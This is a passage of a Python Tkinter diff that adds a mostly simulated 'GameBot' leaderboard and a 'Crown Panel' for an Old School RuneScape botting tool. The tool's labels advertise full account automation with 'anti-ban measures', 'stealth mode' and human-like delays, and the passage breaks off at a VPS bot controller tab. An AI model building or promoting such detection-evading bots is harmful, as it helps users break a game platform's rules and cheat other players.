+        ttk.Label(stats_grid, text=f"Offline: {total_gamebots - online_gamebots}", style='TSM.TLabel').grid(row=0, column=2, sticky=tk.W)
+        
+        # Row 2
+        ttk.Label(stats_grid, text=f"Total Kills: {total_kills:,}", style='TSM.TLabel').grid(row=1, column=0, sticky=tk.W, padx=(0, 20))
+        ttk.Label(stats_grid, text=f"Average Level: {avg_level:.1f}", style='TSM.TLabel').grid(row=1, column=1, sticky=tk.W, padx=(0, 20))
+        ttk.Label(stats_grid, text=f"Top Class: {self.get_top_class()}", style='TSM.TLabel').grid(row=1, column=2, sticky=tk.W)
+    
+    def create_gamebot_leaderboard(self, parent):
+        """Create GameBot leaderboard"""
+        leaderboard_frame = ttk.LabelFrame(parent, text="🏆 GameBot Leaderboard", style='TSM.TLabelframe')
+        leaderboard_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 10))
+        
+        # Create treeview for leaderboard
+        columns = ('Rank', 'Name', 'Class', 'Level', 'Kills', 'XP', 'Status', 'Uptime')
+        self.gamebot_tree = ttk.Treeview(leaderboard_frame, columns=columns, show='headings', style='TSM.Treeview')
+        
+        # Configure columns
+        self.gamebot_tree.heading('Rank', text='Rank')
+        self.gamebot_tree.heading('Name', text='GameBot Name')
+        self.gamebot_tree.heading('Class', text='Class')
+        self.gamebot_tree.heading('Level', text='Level')
+        self.gamebot_tree.heading('Kills', text='Kills')
+        self.gamebot_tree.heading('XP', text='XP')
+        self.gamebot_tree.heading('Status', text='Status')
+        self.gamebot_tree.heading('Uptime', text='Uptime')
+        
+        # Configure column widths
+        self.gamebot_tree.column('Rank', width=50, anchor=tk.CENTER)
+        self.gamebot_tree.column('Name', width=120, anchor=tk.W)
+        self.gamebot_tree.column('Class', width=100, anchor=tk.CENTER)
+        self.gamebot_tree.column('Level', width=60, anchor=tk.CENTER)
+        self.gamebot_tree.column('Kills', width=80, anchor=tk.CENTER)
+        self.gamebot_tree.column('XP', width=100, anchor=tk.CENTER)
+        self.gamebot_tree.column('Status', width=80, anchor=tk.CENTER)
+        self.gamebot_tree.column('Uptime', width=80, anchor=tk.CENTER)
+        
+        # Add scrollbar
+        scrollbar = ttk.Scrollbar(leaderboard_frame, orient=tk.VERTICAL, command=self.gamebot_tree.yview, style='TSM.Vertical.TScrollbar')
+        self.gamebot_tree.configure(yscrollcommand=scrollbar.set)
+        
+        # Pack treeview and scrollbar
+        self.gamebot_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(10, 0), pady=10)
+        scrollbar.pack(side=tk.RIGHT, fill=tk.Y, pady=10)
+        
+        # Populate leaderboard
+        self.populate_gamebot_leaderboard()
+        
+        # Bind selection event
+        self.gamebot_tree.bind('<<TreeviewSelect>>', self.on_gamebot_select)
+    
+    def create_gamebot_controls(self, parent):
+        """Create GameBot control buttons"""
+        controls_frame = ttk.Frame(parent, style='TSM.TFrame')
+        controls_frame.pack(fill=tk.X, pady=(0, 10))
+        
+        # Control buttons
+        ttk.Button(controls_frame, text="🔄 Refresh Leaderboard", 
+                  command=self.refresh_gamebot_leaderboard, style='TSM.TButton').pack(side=tk.LEFT, padx=(0, 10))
+        
+        ttk.Button(controls_frame, text="⚔️ Start Battle", 
+                  command=self.start_gamebot_battle, style='TSM.TButton').pack(side=tk.LEFT, padx=(0, 10))
+        
+        ttk.Button(controls_frame, text="🛡️ Defend Base", 
+                  command=self.defend_gamebot_base, style='TSM.TButton').pack(side=tk.LEFT, padx=(0, 10))
+        
+        ttk.Button(controls_frame, text="🎯 Target Practice", 
+                  command=self.gamebot_target_practice, style='TSM.TButton').pack(side=tk.LEFT, padx=(0, 10))
+        
+        ttk.Button(controls_frame, text="📊 Show Analytics", 
+                  command=self.show_gamebot_analytics, style='TSM.TButton').pack(side=tk.LEFT, padx=(0, 10))
+        
+        ttk.Button(controls_frame, text="👑 Crown Panels", 
+                  command=self.open_crown_panels, style='TSM.TButton').pack(side=tk.LEFT, padx=(0, 10))
+    
+    def populate_gamebot_leaderboard(self):
+        """Populate the GameBot leaderboard"""
+        # Clear existing items
+        for item in self.gamebot_tree.get_children():
+            self.gamebot_tree.delete(item)
+        
+        # Add GameBots to leaderboard
+        for bot in self.gamebot_data:
+            status_color = "🟢" if bot['status'] == 'Online' else "🔴" if bot['status'] == 'Offline' else "🟡"
+            
+            self.gamebot_tree.insert('', 'end', values=(
+                f"#{bot['rank']}",
+                bot['name'],
+                bot['class'],
+                bot['level'],
+                f"{bot['kills']:,}",
+                f"{bot['xp']:,}",
+                f"{status_color} {bot['status']}",
+                bot['uptime']
+            ))
+    
+    def on_gamebot_select(self, event):
+        """Handle GameBot selection"""
+        selection = self.gamebot_tree.selection()
+        if selection:
+            item = self.gamebot_tree.item(selection[0])
+            bot_name = item['values'][1]
+            self.update_status(f"Selected GameBot: {bot_name}")
+    
+    def refresh_gamebot_leaderboard(self):
+        """Refresh the GameBot leaderboard"""
+        # Simulate some random changes
+        for bot in self.gamebot_data:
+            if bot['status'] == 'Online':
+                # Randomly update kills and XP
+                bot['kills'] += random.randint(1, 10)
+                bot['xp'] += random.randint(100, 1000)
+        
+        # Re-sort by kills
+        self.gamebot_data.sort(key=lambda x: x['kills'], reverse=True)
+        
+        # Update ranks
+        for i, bot in enumerate(self.gamebot_data):
+            bot['rank'] = i + 1
+        
+        # Repopulate leaderboard
+        self.populate_gamebot_leaderboard()
+        self.update_status("GameBot leaderboard refreshed")
+    
+    def start_gamebot_battle(self):
+        """Start a GameBot battle simulation"""
+        online_bots = [bot for bot in self.gamebot_data if bot['status'] == 'Online']
+        
+        if len(online_bots) < 2:
+            messagebox.showwarning("Not Enough Bots", "Need at least 2 online GameBots to start a battle!")
+            return
+        
+        # Select random bots for battle
+        bot1, bot2 = random.sample(online_bots, 2)
+        
+        # Simulate battle
+        winner = bot1 if random.random() > 0.5 else bot2
+        loser = bot2 if winner == bot1 else bot1
+        
+        # Update stats
+        winner['kills'] += 1
+        winner['xp'] += 500
+        loser['xp'] += 100  # Participation XP
+        
+        # Re-sort and update ranks
+        self.gamebot_data.sort(key=lambda x: x['kills'], reverse=True)
+        for i, bot in enumerate(self.gamebot_data):
+            bot['rank'] = i + 1
+        
+        # Repopulate leaderboard
+        self.populate_gamebot_leaderboard()
+        
+        messagebox.showinfo("Battle Complete", 
+                           f"⚔️ Battle Result:\n\n"
+                           f"🏆 Winner: {winner['name']} ({winner['class']})\n"
+                           f"💀 Loser: {loser['name']} ({loser['class']})\n\n"
+                           f"Kills: +1 for {winner['name']}\n"
+                           f"XP: +500 for {winner['name']}, +100 for {loser['name']}")
+        
+        self.update_status(f"Battle completed: {winner['name']} defeated {loser['name']}")
+    
+    def defend_gamebot_base(self):
+        """Simulate GameBot base defense"""
+        online_bots = [bot for bot in self.gamebot_data if bot['status'] == 'Online']
+        
+        if not online_bots:
+            messagebox.showwarning("No Online Bots", "No online GameBots available for defense!")
+            return
+        
+        # Simulate defense
+        total_defense = sum(bot['level'] for bot in online_bots)
+        attack_strength = random.randint(50, 200)
+        
+        if total_defense > attack_strength:
+            # Successful defense
+            for bot in online_bots:
+                bot['xp'] += 200
+                bot['kills'] += random.randint(1, 3)
+            
+            messagebox.showinfo("Defense Successful", 
+                               f"🛡️ Base Defense Successful!\n\n"
+                               f"Defense Strength: {total_defense}\n"
+                               f"Attack Strength: {attack_strength}\n\n"
+                               f"All defenders gained XP and kills!")
+        else:
+            # Failed defense
+            messagebox.showwarning("Defense Failed", 
+                                  f"💥 Base Defense Failed!\n\n"
+                                  f"Defense Strength: {total_defense}\n"
+                                  f"Attack Strength: {attack_strength}\n\n"
+                                  f"The base was overrun!")
+        
+        # Re-sort and update
+        self.gamebot_data.sort(key=lambda x: x['kills'], reverse=True)
+        for i, bot in enumerate(self.gamebot_data):
+            bot['rank'] = i + 1
+        
+        self.populate_gamebot_leaderboard()
+        self.update_status("Base defense simulation completed")
+    
+    def gamebot_target_practice(self):
+        """Simulate target practice for GameBots"""
+        online_bots = [bot for bot in self.gamebot_data if bot['status'] == 'Online']
+        
+        if not online_bots:
+            messagebox.showwarning("No Online Bots", "No online GameBots available for target practice!")
+            return
+        
+        # Simulate target practice
+        total_hits = 0
+        for bot in online_bots:
+            hits = random.randint(5, 15)
+            total_hits += hits
+            bot['xp'] += hits * 10
+        
+        messagebox.showinfo("Target Practice Complete", 
+                           f"🎯 Target Practice Results:\n\n"
+                           f"Participants: {len(online_bots)} GameBots\n"
+                           f"Total Hits: {total_hits}\n"
+                           f"Average Hits per Bot: {total_hits // len(online_bots)}\n\n"
+                           f"All participants gained XP!")
+        
+        self.populate_gamebot_leaderboard()
+        self.update_status("Target practice completed")
+    
+    def show_gamebot_analytics(self):
+        """Show GameBot analytics"""
+        total_gamebots = len(self.gamebot_data)
+        online_gamebots = len([bot for bot in self.gamebot_data if bot['status'] == 'Online'])
+        total_kills = sum(bot['kills'] for bot in self.gamebot_data)
+        total_xp = sum(bot['xp'] for bot in self.gamebot_data)
+        avg_level = sum(bot['level'] for bot in self.gamebot_data) / total_gamebots
+        
+        # Class distribution
+        class_counts = {}
+        for bot in self.gamebot_data:
+            class_counts[bot['class']] = class_counts.get(bot['class'], 0) + 1
+        
+        top_class = max(class_counts, key=class_counts.get)
+        
+        analytics_text = f"""
+🎮 GameBot Analytics Report
+========================
+
+📊 General Statistics:
+• Total GameBots: {total_gamebots}
+• Online: {online_gamebots} ({online_gamebots/total_gamebots*100:.1f}%)
+• Offline: {total_gamebots - online_gamebots} ({(total_gamebots - online_gamebots)/total_gamebots*100:.1f}%)
+
+⚔️ Combat Statistics:
+• Total Kills: {total_kills:,}
+• Total XP: {total_xp:,}
+• Average Level: {avg_level:.1f}
+
+🏆 Class Distribution:
+• Most Popular: {top_class} ({class_counts[top_class]} bots)
+• Total Classes: {len(class_counts)}
+
+📈 Top Performers:
+• Highest Level: {max(self.gamebot_data, key=lambda x: x['level'])['name']} (Level {max(bot['level'] for bot in self.gamebot_data)})
+• Most Kills: {max(self.gamebot_data, key=lambda x: x['kills'])['name']} ({max(bot['kills'] for bot in self.gamebot_data):,} kills)
+• Highest XP: {max(self.gamebot_data, key=lambda x: x['xp'])['name']} ({max(bot['xp'] for bot in self.gamebot_data):,} XP)
+        """
+        
+        messagebox.showinfo("GameBot Analytics", analytics_text)
+        self.update_status("GameBot analytics displayed")
+    
+    def get_top_class(self):
+        """Get the most popular GameBot class"""
+        class_counts = {}
+        for bot in self.gamebot_data:
+            class_counts[bot['class']] = class_counts.get(bot['class'], 0) + 1
+        return max(class_counts, key=class_counts.get)
+    
+    def open_crown_panels(self):
+        """Open Crown Panels window for all GameBots"""
+        crown_window = tk.Toplevel(self.root)
+        crown_window.title("👑 GameBot Crown Panels")
+        crown_window.geometry("1000x700")
+        crown_window.configure(bg=TSM_COLORS['dark'])
+        
+        # Center the window
+        crown_window.transient(self.root)
+        crown_window.grab_set()
+        
+        # Main container
+        main_frame = ttk.Frame(crown_window, style='TSM.TFrame')
+        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
+        
+        # Title
+        title_label = ttk.Label(main_frame, 
+                               text="👑 GameBot Crown Panels", 
+                               font=('Arial', 16, 'bold'),
+                               style='TSM.TLabel')
+        title_label.pack(pady=(0, 20))
+        
+        # Create notebook for different GameBot panels
+        crown_notebook = ttk.Notebook(main_frame, style='TNotebook')
+        crown_notebook.pack(fill=tk.BOTH, expand=True)
+        
+        # Create Crown panels for each GameBot
+        for bot in self.gamebot_data:
+            self.create_gamebot_crown_panel(crown_notebook, bot)
+    
+    def create_gamebot_crown_panel(self, parent_notebook, bot):
+        """Create a Crown panel for a specific GameBot"""
+        # Create frame for this GameBot
+        bot_frame = ttk.Frame(parent_notebook, style='TSM.TFrame')
+        parent_notebook.add(bot_frame, text=f"👑 {bot['name']}")
+        
+        # Main container
+        main_container = ttk.Frame(bot_frame, style='TSM.TFrame')
+        main_container.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
+        
+        # Bot info header
+        info_frame = ttk.LabelFrame(main_container, text=f"Bot Information", style='TSM.TLabelframe')
+        info_frame.pack(fill=tk.X, pady=(0, 10))
+        
+        info_grid = ttk.Frame(info_frame, style='TSM.TFrame')
+        info_grid.pack(fill=tk.X, padx=10, pady=10)
+        
+        ttk.Label(info_grid, text=f"Name: {bot['name']}", style='TSM.TLabel').grid(row=0, column=0, sticky=tk.W, padx=(0, 20))
+        ttk.Label(info_grid, text=f"Class: {bot['class']}", style='TSM.TLabel').grid(row=0, column=1, sticky=tk.W, padx=(0, 20))
+        ttk.Label(info_grid, text=f"Level: {bot['level']}", style='TSM.TLabel').grid(row=0, column=2, sticky=tk.W, padx=(0, 20))
+        ttk.Label(info_grid, text=f"Status: {bot['status']}", style='TSM.TLabel').grid(row=0, column=3, sticky=tk.W)
+        
+        ttk.Label(info_grid, text=f"Kills: {bot['kills']:,}", style='TSM.TLabel').grid(row=1, column=0, sticky=tk.W, padx=(0, 20))
+        ttk.Label(info_grid, text=f"XP: {bot['xp']:,}", style='TSM.TLabel').grid(row=1, column=1, sticky=tk.W, padx=(0, 20))
+        ttk.Label(info_grid, text=f"Rank: #{bot['rank']}", style='TSM.TLabel').grid(row=1, column=2, sticky=tk.W, padx=(0, 20))
+        ttk.Label(info_grid, text=f"Port: {bot['port']}", style='TSM.TLabel').grid(row=1, column=3, sticky=tk.W)
+        
+        # Specialized panel based on GameBot
+        if bot['name'] == 'ShadowStrike':
+            self.create_shadowstrike_osrs_panel(main_container, bot)
+        else:
+            self.create_generic_crown_panel(main_container, bot)
+    
+    def create_shadowstrike_osrs_panel(self, parent, bot):
+        """Create ShadowStrike OSRS-specific Crown panel"""
+        # OSRS Stats Frame
+        stats_frame = ttk.LabelFrame(parent, text="🏹 Old School RuneScape Stats", style='TSM.TLabelframe')
+        stats_frame.pack(fill=tk.X, pady=(0, 10))
+        
+        # OSRS Skills Grid
+        skills_frame = ttk.Frame(stats_frame, style='TSM.TFrame')
+        skills_frame.pack(fill=tk.X, padx=10, pady=10)
+        
+        # Combat Stats
+        combat_frame = ttk.LabelFrame(skills_frame, text="⚔️ Combat", style='TSM.TLabelframe')
+        combat_frame.grid(row=0, column=0, sticky=tk.W+tk.E, padx=(0, 10), pady=5)
+        
+        combat_stats = [
+            ("Attack", 99), ("Strength", 99), ("Defence", 85), ("Ranged", 99),
+            ("Prayer", 77), ("Magic", 99), ("Hitpoints", 99), ("Combat Level", 126)
+        ]
+        
+        for i, (skill, level) in enumerate(combat_stats):
+            row = i // 2
+            col = (i % 2) * 2
+            ttk.Label(combat_frame, text=f"{skill}:", style='TSM.TLabel').grid(row=row, column=col, sticky=tk.W, padx=5, pady=2)
+            ttk.Label(combat_frame, text=str(level), style='TSM.TLabel').grid(row=row, column=col+1, sticky=tk.W, padx=(5, 20))
+        
+        # Non-Combat Stats
+        noncombat_frame = ttk.LabelFrame(skills_frame, text="🛠️ Non-Combat", style='TSM.TLabelframe')
+        noncombat_frame.grid(row=0, column=1, sticky=tk.W+tk.E, padx=(10, 0), pady=5)
+        
+        noncombat_stats = [
+            ("Mining", 85), ("Smithing", 80), ("Fishing", 90), ("Cooking", 95),
+            ("Woodcutting", 88), ("Firemaking", 92), ("Crafting", 75), ("Agility", 70)
+        ]
+        
+        for i, (skill, level) in enumerate(noncombat_stats):
+            row = i // 2
+            col = (i % 2) * 2
+            ttk.Label(noncombat_frame, text=f"{skill}:", style='TSM.TLabel').grid(row=row, column=col, sticky=tk.W, padx=5, pady=2)
+            ttk.Label(noncombat_frame, text=str(level), style='TSM.TLabel').grid(row=row, column=col+1, sticky=tk.W, padx=(5, 20))
+        
+        # OSRS Activities Frame
+        activities_frame = ttk.LabelFrame(parent, text="🎮 OSRS Activities", style='TSM.TLabelframe')
+        activities_frame.pack(fill=tk.X, pady=(0, 10))
+        
+        activities_grid = ttk.Frame(activities_frame, style='TSM.TFrame')
+        activities_grid.pack(fill=tk.X, padx=10, pady=10)
+        
+        # PvP Activities
+        pvp_frame = ttk.LabelFrame(activities_grid, text="⚔️ PvP Activities", style='TSM.TLabelframe')
+        pvp_frame.grid(row=0, column=0, sticky=tk.W+tk.E, padx=(0, 10), pady=5)
+        
+        pvp_buttons = [
+            ("🏹 PK at Edgeville", self.shadowstrike_edgeville_pk),
+            ("🗡️ Wilderness PK", self.shadowstrike_wilderness_pk),
+            ("⚔️ Duel Arena", self.shadowstrike_duel_arena),
+            ("🏰 Castle Wars", self.shadowstrike_castle_wars),
+            ("🎯 Fight Pits", self.shadowstrike_fight_pits)
+        ]
+        
+        for i, (text, command) in enumerate(pvp_buttons):
+            ttk.Button(pvp_frame, text=text, command=command, style='TSM.TButton').pack(fill=tk.X, padx=5, pady=2)
+        
+        # PvM Activities
+        pvm_frame = ttk.LabelFrame(activities_grid, text="🐉 PvM Activities", style='TSM.TLabelframe')
+        pvm_frame.grid(row=0, column=1, sticky=tk.W+tk.E, padx=(10, 0), pady=5)
+        
+        pvm_buttons = [
+            ("🐉 Kill Dragons", self.shadowstrike_kill_dragons),
+            ("👹 Slayer Tasks", self.shadowstrike_slayer_tasks),
+            ("🏰 Barrows Runs", self.shadowstrike_barrows),
+            ("💀 KBD", self.shadowstrike_kbd),
+            ("🔥 Fire Cape", self.shadowstrike_fire_cape)
+        ]
+        
+        for i, (text, command) in enumerate(pvm_buttons):
+            ttk.Button(pvm_frame, text=text, command=command, style='TSM.TButton').pack(fill=tk.X, padx=5, pady=2)
+        
+        # Ultimate Bot Control Frame
+        bot_control_frame = ttk.LabelFrame(parent, text="🤖 Ultimate God Status Bot", style='TSM.TLabelframe')
+        bot_control_frame.pack(fill=tk.X, pady=(0, 10))
+        
+        bot_control_grid = ttk.Frame(bot_control_frame, style='TSM.TFrame')
+        bot_control_grid.pack(fill=tk.X, padx=10, pady=10)
+        
+        # Bot control buttons
+        ttk.Button(bot_control_grid, text="🚀 Start Ultimate Bot", 
+                  command=self.shadowstrike_start_ultimate_bot, style='TSM.TButton').grid(row=0, column=0, padx=5, pady=5, sticky=tk.W+tk.E)
+        
+        ttk.Button(bot_control_grid, text="⏹️ Stop Bot", 
+                  command=self.shadowstrike_stop_bot, style='TSM.TButton').grid(row=0, column=1, padx=5, pady=5, sticky=tk.W+tk.E)
+        
+        ttk.Button(bot_control_grid, text="📊 Bot Status", 
+                  command=self.shadowstrike_bot_status, style='TSM.TButton').grid(row=0, column=2, padx=5, pady=5, sticky=tk.W+tk.E)
+        
+        # Bot features info
+        bot_info_text = """
+🤖 Ultimate God Status Bot Features:
+• Complete account automation from creation to max
+• All 23 skills trained to level 99
+• All quests and achievement diaries completed
+• BiS gear acquisition and max cash stack
+• Raids automation (CoX, ToB)
+• High-level bossing and PvP
+• Anti-ban measures and stealth mode
+• Automatic error recovery and restart
+        """
+        
+        ttk.Label(bot_control_frame, text=bot_info_text, style='TSM.TLabel', justify=tk.LEFT).pack(padx=10, pady=5)
+        
+        # Equipment Frame
+        equipment_frame = ttk.LabelFrame(parent, text="⚔️ Equipment Loadout", style='TSM.TLabelframe')
+        equipment_frame.pack(fill=tk.X, pady=(0, 10))
+        
+        equipment_grid = ttk.Frame(equipment_frame, style='TSM.TFrame')
+        equipment_grid.pack(fill=tk.X, padx=10, pady=10)
+        
+        # Melee Setup
+        melee_frame = ttk.LabelFrame(equipment_grid, text="🗡️ Melee Setup", style='TSM.TLabelframe')
+        melee_frame.grid(row=0, column=0, sticky=tk.W+tk.E, padx=(0, 10), pady=5)
+        
+        melee_items = [
+            "Abyssal Whip", "Dragon Defender", "Berserker Ring (i)",
+            "Amulet of Fury", "Fighter Torso", "Dragon Boots"
+        ]
+        
+        for item in melee_items:
+            ttk.Label(melee_frame, text=f"• {item}", style='TSM.TLabel').pack(anchor=tk.W, padx=5, pady=1)
+        
+        # Ranged Setup
+        ranged_frame = ttk.LabelFrame(equipment_grid, text="🏹 Ranged Setup", style='TSM.TLabelframe')
+        ranged_frame.grid(row=0, column=1, sticky=tk.W+tk.E, padx=(10, 0), pady=5)
+        
+        ranged_items = [
+            "Toxic Blowpipe", "Dragon Arrows", "Ava's Accumulator",
+            "Archer's Ring (i)", "Black D'hide Body", "Ranger Boots"
+        ]
+        
+        for item in ranged_items:
+            ttk.Label(ranged_frame, text=f"• {item}", style='TSM.TLabel').pack(anchor=tk.W, padx=5, pady=1)
+        
+        # Status Frame
+        status_frame = ttk.LabelFrame(parent, text="📊 Current Status", style='TSM.TLabelframe')
+        status_frame.pack(fill=tk.X, pady=(0, 10))
+        
+        status_grid = ttk.Frame(status_frame, style='TSM.TFrame')
+        status_grid.pack(fill=tk.X, padx=10, pady=10)
+        
+        status_info = [
+            ("Current Location", "Edgeville"),
+            ("Current Activity", "PKing"),
+            ("Combat Level", "126"),
+            ("Total Level", "1,847"),
+            ("Quest Points", "156"),
+            ("Kill Count", f"{bot['kills']:,}"),
+            ("Death Count", "23"),
+            ("Net Worth", "2.4B GP")
+        ]
+        
+        for i, (label, value) in enumerate(status_info):
+            row = i // 2
+            col = (i % 2) * 2
+            ttk.Label(status_grid, text=f"{label}:", style='TSM.TLabel').grid(row=row, column=col, sticky=tk.W, padx=5, pady=2)
+            ttk.Label(status_grid, text=value, style='TSM.TLabel').grid(row=row, column=col+1, sticky=tk.W, padx=(5, 20))
+    
+    def create_generic_crown_panel(self, parent, bot):
+        """Create a generic Crown panel for other GameBots"""
+        generic_frame = ttk.LabelFrame(parent, text=f"👑 {bot['name']} Crown Panel", style='TSM.TLabelframe')
+        generic_frame.pack(fill=tk.BOTH, expand=True)
+        
+        info_text = f"""
+👑 {bot['name']} Crown Panel
+========================
+
+Class: {bot['class']}
+Level: {bot['level']}
+Status: {bot['status']}
+Kills: {bot['kills']:,}
+XP: {bot['xp']:,}
+Rank: #{bot['rank']}
+
+This is a generic Crown panel for {bot['name']}.
+Specialized panels will be added for each GameBot
+with unique features and activities.
+        """
+        
+        ttk.Label(generic_frame, text=info_text, style='TSM.TLabel', justify=tk.LEFT).pack(padx=20, pady=20)
+    
+    # ShadowStrike OSRS Activity Methods
+    def shadowstrike_edgeville_pk(self):
+        """ShadowStrike PK at Edgeville"""
+        self.update_status("ShadowStrike: Starting PK session at Edgeville...")
+        messagebox.showinfo("Edgeville PK", 
+                           "🏹 ShadowStrike is now PKing at Edgeville!\n\n"
+                           "• Location: Edgeville Wilderness\n"
+                           "• Combat Level: 126\n"
+                           "• Target: Low-level players\n"
+                           "• Risk: Medium\n"
+                           "• Expected Kills: 3-5 per hour")
+    
+    def shadowstrike_wilderness_pk(self):
+        """ShadowStrike Wilderness PK"""
+        self.update_status("ShadowStrike: Entering Wilderness for PK...")
+        messagebox.showinfo("Wilderness PK", 
+                           "🗡️ ShadowStrike is now in the Wilderness!\n\n"
+                           "• Location: Deep Wilderness\n"
+                           "• Combat Level: 126\n"
+                           "• Target: High-level players\n"
+                           "• Risk: High\n"
+                           "• Expected Kills: 1-3 per hour")
+    
+    def shadowstrike_duel_arena(self):
+        """ShadowStrike Duel Arena"""
+        self.update_status("ShadowStrike: Entering Duel Arena...")
+        messagebox.showinfo("Duel Arena", 
+                           "⚔️ ShadowStrike is now at the Duel Arena!\n\n"
+                           "• Location: Al Kharid Duel Arena\n"
+                           "• Combat Level: 126\n"
+                           "• Target: Staking opponents\n"
+                           "• Risk: Very High\n"
+                           "• Expected Wins: 60-70%")
+    
+    def shadowstrike_castle_wars(self):
+        """ShadowStrike Castle Wars"""
+        self.update_status("ShadowStrike: Joining Castle Wars...")
+        messagebox.showinfo("Castle Wars", 
+                           "🏰 ShadowStrike is now in Castle Wars!\n\n"
+                           "• Location: Castle Wars Arena\n"
+                           "• Combat Level: 126\n"
+                           "• Target: Enemy team\n"
+                           "• Risk: None\n"
+                           "• Expected Kills: 5-8 per game")
+    
+    def shadowstrike_fight_pits(self):
+        """ShadowStrike Fight Pits"""
+        self.update_status("ShadowStrike: Entering Fight Pits...")
+        messagebox.showinfo("Fight Pits", 
+                           "🎯 ShadowStrike is now in the Fight Pits!\n\n"
+                           "• Location: TzHaar Fight Pits\n"
+                           "• Combat Level: 126\n"
+                           "• Target: All opponents\n"
+                           "• Risk: Medium\n"
+                           "• Expected Kills: 2-4 per round")
+    
+    def shadowstrike_kill_dragons(self):
+        """ShadowStrike Kill Dragons"""
+        self.update_status("ShadowStrike: Starting Dragon slaying...")
+        messagebox.showinfo("Dragon Slaying", 
+                           "🐉 ShadowStrike is now slaying dragons!\n\n"
+                           "• Location: Various Dragon lairs\n"
+                           "• Target: Green/Blue/Red Dragons\n"
+                           "• Risk: Low-Medium\n"
+                           "• Expected Loot: 50-100K GP/hour")
+    
+    def shadowstrike_slayer_tasks(self):
+        """ShadowStrike Slayer Tasks"""
+        self.update_status("ShadowStrike: Starting Slayer tasks...")
+        messagebox.showinfo("Slayer Tasks", 
+                           "👹 ShadowStrike is now on Slayer tasks!\n\n"
+                           "• Location: Various Slayer dungeons\n"
+                           "• Target: Assigned monsters\n"
+                           "• Risk: Low-High (varies)\n"
+                           "• Expected XP: 15-25K/hour")
+    
+    def shadowstrike_barrows(self):
+        """ShadowStrike Barrows Runs"""
+        self.update_status("ShadowStrike: Starting Barrows runs...")
+        messagebox.showinfo("Barrows Runs", 
+                           "🏰 ShadowStrike is now doing Barrows!\n\n"
+                           "• Location: Barrows Crypts\n"
+                           "• Target: Barrows Brothers\n"
+                           "• Risk: Medium\n"
+                           "• Expected Loot: 100-500K GP/run")
+    
+    def shadowstrike_kbd(self):
+        """ShadowStrike KBD"""
+        self.update_status("ShadowStrike: Fighting King Black Dragon...")
+        messagebox.showinfo("KBD Fight", 
+                           "💀 ShadowStrike is now fighting KBD!\n\n"
+                           "• Location: King Black Dragon Lair\n"
+                           "• Target: King Black Dragon\n"
+                           "• Risk: High\n"
+                           "• Expected Loot: 200K-2M GP/kill")
+    
+    def shadowstrike_fire_cape(self):
+        """ShadowStrike Fire Cape Attempt"""
+        self.update_status("ShadowStrike: Attempting Fire Cape...")
+        messagebox.showinfo("Fire Cape Attempt", 
+                           "🔥 ShadowStrike is attempting Fire Cape!\n\n"
+                           "• Location: TzHaar Fight Cave\n"
+                           "• Target: All waves + Jad\n"
+                           "• Risk: Very High\n"
+                           "• Success Rate: 85%")
+    
+    def shadowstrike_start_ultimate_bot(self):
+        """Start ShadowStrike Ultimate God Status Bot"""
+        self.update_status("ShadowStrike: Starting Ultimate God Status Bot...")
+        
+        # Check if bot is already running
+        if hasattr(self, 'shadowstrike_bot_running') and self.shadowstrike_bot_running:
+            messagebox.showwarning("Bot Already Running", "ShadowStrike Ultimate Bot is already running!")
+            return
+        
+        # Confirm bot start
+        if not messagebox.askyesno("Start Ultimate Bot", 
+                                 "🚀 Start ShadowStrike Ultimate God Status Bot?\n\n"
+                                 "This will begin the complete automation process:\n"
+                                 "• Phase 0: Account Creation & Tutorial\n"
+                                 "• Phase 1: Early Game Skilling\n"
+                                 "• Phase 2: Mid-Game Progression\n"
+                                 "• Phase 3: High-Level Skilling\n"
+                                 "• Phase 4: End-Game Optimization\n\n"
+                                 "⚠️ This process will take many hours to complete!"):
+            return
+        
+        # Start bot in separate thread
+        self.shadowstrike_bot_running = True
+        bot_thread = threading.Thread(target=self.run_shadowstrike_bot, daemon=True)
+        bot_thread.start()
+        
+        messagebox.showinfo("Bot Started", 
+                           "🤖 ShadowStrike Ultimate Bot Started!\n\n"
+                           "The bot is now running in the background.\n"
+                           "Check the status bar for progress updates.\n"
+                           "Logs are being saved to 'shadowstrike_bot.log'")
+    
+    def run_shadowstrike_bot(self):
+        """Run ShadowStrike Ultimate Bot"""
+        try:
+            from ShadowStrike_OSRS_Bot import ShadowStrikeOSRSBot
+            bot = ShadowStrikeOSRSBot()
+            bot.run()
+        except Exception as e:
+            self.update_status(f"ShadowStrike Bot Error: {str(e)}")
+            logger.error(f"ShadowStrike Bot Error: {e}")
+        finally:
+            self.shadowstrike_bot_running = False
+            self.update_status("ShadowStrike Bot stopped")
+    
+    def shadowstrike_stop_bot(self):
+        """Stop ShadowStrike Ultimate Bot"""
+        if hasattr(self, 'shadowstrike_bot_running') and self.shadowstrike_bot_running:
+            self.shadowstrike_bot_running = False
+            self.update_status("ShadowStrike: Stopping Ultimate Bot...")
+            messagebox.showinfo("Bot Stopped", "ShadowStrike Ultimate Bot has been stopped.")
+        else:
+            messagebox.showwarning("No Bot Running", "No bot is currently running.")
+    
+    def shadowstrike_bot_status(self):
+        """Show ShadowStrike Bot Status"""
+        if hasattr(self, 'shadowstrike_bot_running') and self.shadowstrike_bot_running:
+            status_text = """
+🤖 ShadowStrike Ultimate Bot Status
+================================
+
+Status: RUNNING
+Phase: Ultimate God Status Mode
+Progress: Automated progression through all phases
+
+Current Activities:
+• Account creation and tutorial completion
+• Early game skilling and questing
+• Mid-game progression and combat training
+• High-level skilling with tick manipulation
+• End-game optimization and raids
+
+Features:
+• Anti-ban measures enabled
+• Human-like delays and behavior
+• Automatic error recovery
+• Progress logging
+• Stealth mode active
+
+⚠️ Bot is running in background
+Check 'shadowstrike_bot.log' for detailed logs
+            """
+        else:
+            status_text = """
+🤖 ShadowStrike Ultimate Bot Status
+================================
+
+Status: STOPPED
+Phase: Ready to start
+Progress: Waiting for activation
+
+Available Features:
+• Complete account automation
+• All 23 skills to level 99
+• All quests completion
+• BiS gear acquisition
+• Max cash stack (2.147B GP)
+• Raids and bossing automation
+• PvP and PvM activities
+
+Click 'Start Ultimate Bot' to begin!
+            """
+        
+        messagebox.showinfo("Bot Status", status_text)
+    
+    def create_vps_bot_controller_tab(self):
+        """Create VPS Bot Controller tab for remote bot control"""
+        vps_frame = ttk.Frame(self.notebook, style='TSM.TFrame')
+        self.notebook.add(vps_frame, text="🌐 VPS Bot Controller")
+        
+        # Title
